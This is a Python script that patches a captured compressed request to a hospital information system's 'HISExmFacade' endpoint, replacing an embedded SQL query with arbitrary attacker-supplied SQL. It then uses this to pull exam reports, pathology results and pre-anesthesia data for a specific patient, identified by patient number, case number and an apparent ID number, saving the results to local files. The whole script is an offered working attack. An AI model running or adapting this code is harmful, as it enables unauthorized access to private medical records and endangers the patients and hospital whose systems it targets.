from his_client_final import HISClient
import requests
import zlib
import re

class LabSearcher7(HISClient):
    def execute_sql(self, sql):
        try:
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()
            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            target_len = len(original_sql_bytes)
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            padded_sql = sql.ljust(target_len)
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

searcher = LabSearcher7()

hhistnum = '003617083J'
hcaseno = '75176986'
opid = 'F129348478'

# 1. Query OPDUSR.EXMREPD for HCASENO 75176986 (case number)
print(f"1. Querying OPDUSR.EXMREPD for HCASENO {hcaseno}...")
sql1 = f"SELECT * FROM OPDUSR.EXMREPD WHERE HCASENO = '{hcaseno}'"
res1 = searcher.execute_sql(sql1)
if res1 and "<DRMODIFY>" in res1:
    print("[+] Found in EXMREPD by HCASENO!")
    with open("exmrepd_hcaseno_new.txt", "w", encoding="utf-8") as f:
        f.write(res1)
    print(res1[:800])
else:
    print("[-] Not found in EXMREPD by HCASENO.")

# 2. Try OPDUSR.EXMREPD with HHISNUM (patient ID)
print(f"\n2. Querying OPDUSR.EXMREPD for HHISNUM {hhistnum}...")
sql2 = f"SELECT * FROM OPDUSR.EXMREPD WHERE HHISNUM = '{hhistnum}'"
res2 = searcher.execute_sql(sql2)
if res2 and "<DRMODIFY>" in res2:
    print("[+] Found in EXMREPD by HHISNUM!")
    with open("exmrepd_hhisnum.txt", "w", encoding="utf-8") as f:
        f.write(res2)
    print(res2[:800])
else:
    print("[-] Not found in EXMREPD by HHISNUM.")

# 3. Try PAT_RESULTH with HCASENO as PRH_ORDER_NO
print(f"\n3. Querying PAT_RESULTH for HCASENO {hcaseno} as PRH_ORDER_NO...")
sql3 = f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_ORDER_NO LIKE '%{hcaseno}%'"
res3 = searcher.execute_sql(sql3)
if res3 and "<DRMODIFY>" in res3:
    print("[+] Found in PAT_RESULTH by HCASENO in PRH_ORDER_NO!")
    with open("pat_resulth_hcaseno_order.txt", "w", encoding="utf-8") as f:
        f.write(res3)
    print(res3[:800])
else:
    print("[-] Not found in PAT_RESULTH by HCASENO in PRH_ORDER_NO.")

# 4. Try fetching ORMC430 with HCASENO as ORDSEQ
print(f"\n4. Fetching ORMC430 with HCASENO {hcaseno} as ORDSEQ...")
data = searcher.get_pre_anesthesia_data(hcaseno, hhistnum)
if data:
    print(f"[+] Got data! Keys: {list(data.keys())}")
    inspection = data.get('INSPECTION', [])
    print(f"[+] INSPECTION records: {len(inspection)}")
    for rec in inspection[:5]:
        print(f"  {rec}")
else:
    print("[-] No data returned.")
